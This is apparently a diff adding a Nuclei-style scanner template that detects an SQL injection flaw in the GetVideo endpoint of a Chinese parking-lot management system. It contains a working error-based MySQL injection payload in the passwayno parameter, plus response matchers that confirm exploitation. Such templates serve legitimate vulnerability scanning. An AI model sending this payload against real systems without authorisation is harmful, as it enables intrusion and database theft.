@@ -1,0 +1,31 @@
+id: poc-yaml-cxyun-getvideo-sqli
+info:
+  name: 停车场后台管理系统 GetVideo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/LaneMonitor/GetVideo?passwayno=1%27+AND+GTID_SUBSET%28CONCAT%28md5({{t1}})%2C%28SELECT+%28ELT%283079%3D3079%2C0x3a%29%29%29%2C0x3a%29%2C3079%29+AND+%27OVwj%27%3D%27OVwj"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "set specification"
+          - "\"success\":false"
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
